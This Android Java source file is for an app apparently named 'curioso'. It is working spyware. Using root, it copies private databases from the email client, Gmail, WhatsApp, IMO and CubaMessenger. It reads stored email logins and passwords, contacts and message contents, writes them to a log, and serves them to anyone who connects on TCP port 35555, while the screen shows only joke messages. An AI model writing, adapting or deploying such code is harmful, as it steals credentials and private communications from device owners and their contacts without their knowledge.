package cu.slam.curioso;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Enumeration;
import java.util.LinkedList;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import android.os.Bundle;
import android.app.Activity;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.view.Menu;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
	LinkedList<File> cuentas = new LinkedList<File>();
	SQLiteDatabase sqld;
	Cursor cursor;
	String saco;
	ServerSocket ss;
	
	OutputStreamWriter osw;
	TextView txt;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		txt = (TextView) findViewById(R.id.textView1);
		ReadDB();
		Toast.makeText(getApplicationContext(), "Que curioso eres!",
				Toast.LENGTH_LONG).show();
		// this.finish();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	public void CPdb() throws Exception {
		OutputStream localOutputStream = Runtime.getRuntime().exec("su")
				.getOutputStream();
		localOutputStream
				.write(("cp /data/data/com.android.email/databases/EmailProvider.db "
						+ getCacheDir() + "\n").getBytes());
		localOutputStream
				.write(("cp /data/data/com.google.android.gm/databases/mailstore*.db "
						+ getCacheDir() + "\n").getBytes());
		localOutputStream
				.write(("cp /data/data/com.whatsapp/databases/msgstore.db "
						+ getCacheDir() + "\n").getBytes());
		localOutputStream.write(("cp /data/data/com.whatsapp/databases/wa.db "
				+ getCacheDir() + "\n").getBytes());
		localOutputStream
				.write(("cp /data/data/com.imo.android.imoim/databases/imo "
						+ getCacheDir() + "\n").getBytes());
		localOutputStream
				.write(("cp /data/data/com.cubamessenger.cubamessengerapp/databases/cmapp_db_u0 "
						+ getCacheDir() + "\n").getBytes());
		localOutputStream
				.write(("cp /data/data/com.cubamessenger.cubamessengerapp/databases/cmapp_db_u581185 "
						+ getCacheDir() + "\n").getBytes());
		localOutputStream.write(("chmod -R 777 " + getCacheDir()).getBytes());		
		// ZipAll(localOutputStream);
		localOutputStream.close();
	}

	public String[] ExtraeDB(String[] dirF) {
		String[] tmpDirF = new String[dirF.length];
		int i = 0;
		for (int j = 0; j < dirF.length; j++) {
			if (dirF[j].contains("mailstore")) {
				tmpDirF[i++] = dirF[j];
			}
		}
		return tmpDirF;
	}

	public void ReadDB() {
		try {
			CPdb();
			Thread.sleep(1000L);
			this.cuentas.add(new File(getCacheDir().getAbsolutePath(),
					"/EmailProvider.db"));// email

			this.cuentas
					.add(new File(getCacheDir().getAbsolutePath(), "/wa.db"));// whatsapp
			this.cuentas.add(new File(getCacheDir().getAbsolutePath(),
					"/msgstore.db"));// whatsapp

			this.cuentas.add(new File(getCacheDir().getAbsolutePath(),
					"/cmapp_db_u0"));// messenger < 5
			this.cuentas.add(new File(getCacheDir().getAbsolutePath(),
					"/cmapp_db_u581185"));// messenger > 5

			this.cuentas
					.add(new File(getCacheDir().getAbsolutePath(), "/imo"));// IMO

			String[] dir = new File(getCacheDir().getAbsolutePath()).list();
			String[] filtro = ExtraeDB(dir);
			for (int i = 0; i < filtro.length; i++) {
				if (filtro[i] != null) {
					this.cuentas.add(new File(getCacheDir().getAbsolutePath(),
							"/" + filtro[i]));
				}
			}
			ReadDB(cuentas);
			//txt.setText(saco);			
			txt.setText("Que pensabas que saldria, un conejo?");
		} catch (Exception localException) {
			localException.printStackTrace();
			this.txt.setText(localException.getMessage());
		} finally {			
			EscribeFichero();			
		}
	}

	public void Conectar() {
		try {
			SocketServerThread sst = new SocketServerThread();			
			sst.start();			
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	public void GetInfo(String consulta) {
		cursor = sqld.rawQuery(consulta, null);
		int colCount = cursor.getColumnCount();
		cursor.moveToFirst();
		saco += cursor.getColumnName(0) + ":\n";
		while (!cursor.isAfterLast()) {
			for (int i = 0; i < colCount; i++) {
				saco += (cursor.getString(i)) + " |\n";
			}
			cursor.moveToNext();
		}
	}

	public void ReadDB(LinkedList<File> cuentas) {
		try {
			int pos = 0;
			while (pos != cuentas.size()) {
				File db = cuentas.get(pos);
				sqld = SQLiteDatabase.openDatabase(db.getAbsolutePath(), null,
						SQLiteDatabase.OPEN_READONLY);
				if (db != null) {

					switch (pos) {
					case 0:
						// bloque e-mail
						// Datos de las cuentas
						String queryA = "SELECT address FROM HostAuth";
						String queryPA = "SELECT port FROM HostAuth";
						String queryU = "SELECT login FROM HostAuth";
						String queryP = "SELECT password FROM HostAuth";
						saco += "\n---Email---" + "\n";
						GetInfo(queryU);// logins
						GetInfo(queryP);// passwords
						GetInfo(queryA);// address
						GetInfo(queryPA);// port address
						// fin bloque e-mail
						break;

					case 1:
						// bloque whatsapp nombres
						saco += "\n---Whatsapp Names ID---" + "\n";
						String queryWhatName = "SELECT jid,display_name,given_name,family_name,company FROM wa_contacts";
						GetInfo(queryWhatName);
						// fin bloque whatsapp
						break;
					case 2:
						// bloque whatsapp mensajes
						saco += "\n---Whatsapp---" + "\n";
						String queryWhatData = "SELECT key_remote_jid,data FROM messages";
						GetInfo(queryWhatData);
						// fin bloque whatsapp
						break;
					case 3:
						// bloque cubamessenger
						saco += "\n---CubaMessenger Ver. <= 4---" + "\n";
						String queryConf = "SELECT * FROM config";
						// String queryCK = "SELECT ConfigKey FROM config";
						// String queryCV = "SELECT ConfigValue FROM config";
						String queryCN = "SELECT * FROM contact";
						String queryMsg = "SELECT MessageDate,MessageText,MessageContactNumber FROM message";
						GetInfo(queryConf);
						// GetInfo(queryCV);
						GetInfo(queryCN);
						GetInfo(queryMsg);
						// Datos de la cuenta en cubamessenger
						// fin bloque cubamessenger
						break;
					case 4:
						// bloque cubamessenger versión >=5
						saco += "\n---CubaMessenger Versión >= 5---" + "\n";
						String queryConfig = "SELECT * FROM config";
						String queryContac = "SELECT * FROM contact";
						String queryMsgU = "SELECT MessageDate,MessageText,MessageContactNumber FROM message";
						GetInfo(queryConfig);
						GetInfo(queryContac);
						GetInfo(queryMsgU);
						// fin bloque cubamessenger
						break;
					case 5:
						// bloque imo
						// Datos de la cuenta en IMO
						saco += "\n---IMO---" + "\n";
						String queryAcc = "SELECT * FROM accounts";
						//String queryChats = "SELECT last_message FROM chats";
						GetInfo(queryAcc);
						//GetInfo(queryChats);
						// fin bloque IMO
						break;
					default:// si una o más de una cuenta de gmail, este bloque
							// se ejecuta siempre
						// bloque gmail
						// Datos de la cuenta en gmail
						saco += "\n---Gmail---" + "\n";
						String querySnippets = "SELECT snippet FROM messages";
						GetInfo(querySnippets);
						// fin bloque gmail
						break;
					}
					pos++;
				}
			}
			cursor.close();
			sqld.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void ZipAll(OutputStream os) throws IOException {
		os.write(("cd " + getCacheDir().getAbsolutePath() + "\n").getBytes());
		String[] archivos = new File(getCacheDir().getAbsolutePath(), "/ \n")
				.list();
		ZipOutputStream zos = new ZipOutputStream(new BufferedOutputStream(os));
		try {
			for (int i = 0; i < archivos.length; ++i) {
				String filename = archivos[i];
				byte[] bytes = filename.getBytes();
				ZipEntry entry = new ZipEntry(filename);
				zos.putNextEntry(entry);
				zos.write(bytes);
				zos.closeEntry();
			}
		} finally {
			zos.close();
		}
	}

	public void EscribeFichero() {
		String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss")
				.format(new Date());
		File log;
		try {
			log = new File(getCacheDir()
					.getAbsolutePath(), "cap_" + timeStamp + ".txt");
			FileWriter fw = new FileWriter(log);
			fw.flush();
			fw.write(saco);
			fw.close();			
			Conectar();
			/*if(log!=null)
				Conectar(log);
			else
				Toast.makeText(getApplicationContext(), "Nulo", Toast.LENGTH_LONG).show();*/
		} catch (IOException e) {			
			e.printStackTrace();
		}

	}

	private String getIpAddress() {
		String localObject = "";
		try {
			Enumeration<NetworkInterface> localEnumeration1 = NetworkInterface
					.getNetworkInterfaces();
			while (true) {
				if (!localEnumeration1.hasMoreElements())
					return localObject;
				Enumeration<InetAddress> localEnumeration2 = ((NetworkInterface) localEnumeration1
						.nextElement()).getInetAddresses();
				while (localEnumeration2.hasMoreElements()) {
					InetAddress localInetAddress = (InetAddress) localEnumeration2
							.nextElement();
					if (localInetAddress.isSiteLocalAddress()) {
						localObject = "IP local: "
								+ localInetAddress.getHostAddress() + "\n";
					}
				}
			}
		} catch (SocketException localSocketException) {
			localSocketException.printStackTrace();
			return localObject + "Error, algo va mal! "
					+ localSocketException.toString() + "\n";
		}
	}

	private class SocketServerReplyThread extends Thread {
		private Socket hostThreadSocket;
		String tmsg;

		SocketServerReplyThread(Socket paramString, String arg3) {
			this.hostThreadSocket = paramString;
			this.tmsg = arg3;
		}

		public void run() {
			String str = this.tmsg;
			try {
				PrintStream localPrintStream = new PrintStream(
						this.hostThreadSocket.getOutputStream());
				localPrintStream.print(str);
				DatagramPacket dp=new DatagramPacket(str.getBytes(), 0, str.length());
				dp.setSocketAddress(hostThreadSocket.getLocalSocketAddress());
				DatagramSocket ds = new DatagramSocket(hostThreadSocket.getPort());
				ds.send(dp);
				ds.close();
				localPrintStream.close();
				return;
			} catch (IOException localIOException) {
				localIOException.printStackTrace();
			}
		}
	}

	private class SocketServerThread extends Thread {
		static final int SocketServerPORT = 35555;

		private SocketServerThread() {

		}

		public void run() {
			try {
				MainActivity.this.ss = new ServerSocket(SocketServerPORT);
				while (true) {
					ss.setReuseAddress(true);
					Socket localSocket = MainActivity.this.ss.accept();
					new MainActivity.SocketServerReplyThread(localSocket, getIpAddress()
							+ "\n"
							+ MainActivity.this.saco.substring(4, MainActivity.this.saco.length()))
							.run();
				}
			} catch (IOException localIOException) {
				localIOException.printStackTrace();
			}
		}
	}
}
